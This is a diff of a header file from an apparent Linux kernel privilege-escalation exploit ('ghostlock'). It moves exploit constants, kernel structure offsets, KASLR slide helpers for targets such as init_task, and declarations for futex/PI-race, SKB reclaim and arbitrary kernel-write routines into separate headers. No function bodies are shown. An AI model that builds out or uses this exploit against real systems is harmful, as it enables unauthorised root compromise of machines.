@@ -6,24 +6,17 @@
 #endif
 #define __ARM 1
 
-#include "offset.h"
-#include "runtime_struct_offsets.h"
+#include "kernel/offset.h"
+#include "kernel/runtime_struct_offsets.h"
 #include "memory/address_space.h"
 #include "memory/payload_builder.h"
 #include "session/runtime_config.h"
-#include "runtime_time.h"
+#include "support/time.h"
 #include "memory/heap_context.h"
-#include "pi_race.h"
+#include "race/pi_race.h"
 #include "session/exploit_session.hpp"
 
-namespace ghostlock::kernel {
-
-inline constexpr unsigned PAGE_SHIFT = 12;
-inline constexpr unsigned long PAGE_SIZE = 1UL << PAGE_SHIFT;
-inline constexpr unsigned KS_PAGE_SIZE = 4096;
-inline constexpr unsigned long long KS_PAGE_MASK = 0xfffULL;
-
-} // namespace ghostlock::kernel
+#include "kernel/constants.hpp"
 
 #include <dirent.h>
 #include <cerrno>
@@ -54,157 +47,10 @@ inline constexpr unsigned long long KS_PAGE_MASK = 0xfffULL;
 
 #include "kernelsnitch/utils.h"
 
-namespace ghostlock::kernel {
+#include "profile/accessors.hpp"
+#include "support/decls.hpp"
+#include "route/route_api.hpp"
 
-inline constexpr long long SKB_DATA_DELTA = -0xe80LL;
-inline constexpr unsigned long MM_STRUCT_SZ = 0x500;
-
-inline constexpr unsigned MM_ORDER = 3;
-inline constexpr unsigned MM_PARTIALS = 5;
-
-inline constexpr unsigned long ORDER3_SIZE = PAGE_SIZE << MM_ORDER;
-inline constexpr unsigned long SKB_SEND_SIZE = ORDER3_SIZE * 2;
-inline constexpr unsigned SKB_RECLAIM_SENDS = 4;
-inline constexpr unsigned long FOPS_TABLE_OFF = FOPS_OFF;
-inline constexpr int SKB_FRAG_BIAS = 0;
-
-inline constexpr int FAKE_TASK_PRIO = 120;
-inline constexpr int FAKE_WAITER_PRIO = 140;
-inline constexpr unsigned FAKE_TASK_UCLAMP_REQ_OFF = 0x350;
-inline constexpr unsigned FAKE_TASK_UCLAMP_OFF = 0x358;
-inline constexpr unsigned FAKE_UCLAMP_ACTIVE_BIT = 16;
-inline constexpr unsigned FAKE_UCLAMP_MIN_ACTIVE = 1U << FAKE_UCLAMP_ACTIVE_BIT;
-inline constexpr unsigned FAKE_UCLAMP_MAX_ACTIVE =
-    (1024U | (19U << 11) | (1U << FAKE_UCLAMP_ACTIVE_BIT));
-
-inline constexpr unsigned TASK_COMM_LEN = 16;
-
-inline constexpr unsigned PSELECT_ROUTE_NFDS = 320;
-inline constexpr int PSELECT_CONSUMER_NICE = 19;
-inline constexpr unsigned PSELECT_CONSUMER_SETTLE_USEC = 250000;
-
-} // namespace ghostlock::kernel
-
-namespace ghostlock::kernel {
-
-struct local_sched_attr {
-    uint32_t size;
-    uint32_t sched_policy;
-    uint64_t sched_flags;
-    int32_t sched_nice;
-    uint32_t sched_priority;
-    uint64_t sched_runtime;
-    uint64_t sched_deadline;
-    uint64_t sched_period;
-};
-
-
-/* Measured direct-map end (defaults to the built-in bound). */
-extern uint64_t g_direct_map_end;
-
-} // namespace ghostlock::kernel
-
-namespace ghostlock::profile {
-
-inline uint32_t kernelsnitch_collisions() {
-    return symbol_u32(&kernel_offsets::kernelsnitch_collisions, 4);
-}
-
-inline uintptr_t slide_nfulnl_logger() {
-    return ghostlock::session::g_exploit_session.addresses.data_alias(slide_nfulnl_logger_image());
-}
-inline uintptr_t slide_loggers_0_1() {
-    return ghostlock::session::g_exploit_session.addresses.data_alias(slide_loggers_0_1_image());
-}
-inline uintptr_t slide_random_boot_id_data() {
-    return ghostlock::session::g_exploit_session.addresses.data_alias(slide_random_boot_id_data_image());
-}
-inline uintptr_t slide_init_task() {
-    return ghostlock::session::g_exploit_session.addresses.data_alias(slide_init_task_image());
-}
-inline uintptr_t slide_root_task_group() {
-    return ghostlock::session::g_exploit_session.addresses.data_alias(slide_root_task_group_image());
-}
-inline uintptr_t slide_sysctl_bootid() {
-    return ghostlock::session::g_exploit_session.addresses.data_alias(slide_sysctl_bootid_image());
-}
-
-} // namespace ghostlock::profile
-
-namespace ghostlock::support {
-    void read_first_line(const char *path, char *buf, size_t len);
-
-    void log_startup_context(void);
-
-    void log_sync(void);
-
-    void disable_rseq_for_thread(void);
-
-    void init_p0_profile(void);
-
-    long futex_op(
-        uint32_t *uaddr, int op, uint32_t val,
-        const void *timeout_or_value, uint32_t *uaddr2, uint32_t val3);
-
-    long sched_setattr_tid(int tid, int nice_value);
-
-    void put64(unsigned char *p, size_t off, uint64_t value);
-
-    void put32(unsigned char *p, size_t off, uint32_t value);
-
-    pid_t clone_child(void);
-
-    pid_t clone_leak_child(void);
-
-    int open_memfd(pid_t child);
-
-    void kill_child(pid_t child);
-
-    void close_reclaim_sockets(void);
-
-    int quarantine_reclaim_sockets(void);
-
-    void release_quarantined_reclaim_sockets(void);
-
-    int stash_prebuilt_page(void);
-
-    int activate_prebuilt_page(void);
-
-    void discard_prebuilt_page(void);
-
-    void cleanup_page_prepare_state(void);
-
-    int clone_memfd(void);
-
-    void prepare_ctxs(void);
-
-    int prepare_skb_payload(uintptr_t base, const ghostlock::memory::WriteRequest *request);
-
-    uintptr_t prepare_kernel_page(const ghostlock::memory::WriteRequest *request);
-
-    uintptr_t prepare_good_kernel_page(const ghostlock::memory::WriteRequest *request);
-} // namespace ghostlock::support
-
-namespace ghostlock::route {
-    void fdset_put_word(fd_set *set, int word, uint64_t value);
-
-    uint64_t fdset_get_word(const fd_set *set, int word);
-
-    void reserve_standard_io(void);
-
-    RouteStatus do_pselect_fake_lock_route(const ghostlock::memory::WriteRequest *request);
-
-    RouteStatus do_tcp_fake_lock_route(const ghostlock::memory::WriteRequest *request);
-
-    RouteStatus do_kernel5_fake_lock_route(const ghostlock::memory::WriteRequest *request);
-
-    int kernel5_resident_start(void);
-
-    int kernel5_resident_write(uintptr_t target, uintptr_t value);
-
-    void kernel5_resident_stop(void);
-} // namespace ghostlock::route
-
-#include "runtime_struct_offsets.h"
+#include "kernel/runtime_struct_offsets.h"
 
 #endif
